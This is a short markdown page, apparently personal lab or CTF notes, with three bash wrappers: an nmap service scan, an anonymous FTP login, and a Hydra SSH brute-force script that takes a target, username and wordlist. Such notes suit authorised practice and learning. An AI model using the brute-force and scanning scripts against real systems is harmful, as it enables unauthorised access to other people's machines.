# 🛠️ Useful Scripts

## Scripts I Used

### Nmap Quick Scan

```bash
#!/bin/bash
# scan.sh
# Usage: ./scan.sh <target_ip>

echo "🔍 Scanning $1..."
nmap -sV -sC $1
echo "✅ Done!"
```

### FTP Anonymous Login

```bash
#!/bin/bash
# ftp-anon.sh
# Usage: ./ftp-anon.sh <target_ip>

echo "📁 Connecting to FTP on $1..."
ftp -a $1
echo "✅ Done!"
```

### Hydra SSH Brute Force

```bash
#!/bin/bash
# hydra-ssh.sh
# Usage: ./hydra-ssh.sh <target_ip> <username> <wordlist>

echo "🔐 Brute forcing SSH on $1..."
hydra -l $2 -P $3 ssh://$1
echo "✅ Done!"
```

---

**Made with 💜 by Swoyon**
